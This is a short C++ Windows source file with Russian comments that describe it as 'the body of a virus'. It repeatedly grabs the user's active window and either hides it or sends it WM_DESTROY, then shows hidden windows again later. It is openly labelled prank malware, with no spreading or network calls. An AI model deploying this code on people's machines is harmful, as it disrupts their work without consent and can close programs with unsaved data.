#include <Windows.h>
#include "Header.h"

//функция возвращающая текущее активное окно
HWND Activetes()
{
    HWND ActiveWindow = GetForegroundWindow();
    //int Actives = GetWindowTextA(ActiveWindow, title, 256);
    return ActiveWindow;
}

//само тело вируса
void virus()
{
    int a = 0;
    while (a < times)
    {
        //получаем дескриптор текущего открытого окна
        HWND Active = Activetes();
        //прячем и запоминаем программы которые сейчас в активном режиме
        //если мод = 1 то мы просто скрываем активные окна
        if (mode == 1)
        {
            ShowWindow(Active, SW_HIDE);
        }
        //если мод = 2 то вместо того, что бы скрывать окна мы посылаем им сообщения, что бы они закрылись(WM_DESTROY)
        else if (mode == 2)
        {
            SendMessage(Active, WM_DESTROY, 0, 0);
        }
        //добавляем в массив с программами те которые мы скрыли/закрыли(предварительно проверяя не является ли дескриптор битым)
        actives[a] = Active;
        a++;
        Sleep(1000);
    }
    //обратно показываем все программы которые скрыли
    for (int i = 0; i < 10; i++)
    {
        //цикл который пробегается по нашему массиву закрытых программ и показывает их(предварительно проверяя, что дескриптор не битый)
        ShowWindow(actives[i], SW_SHOW);
    }
}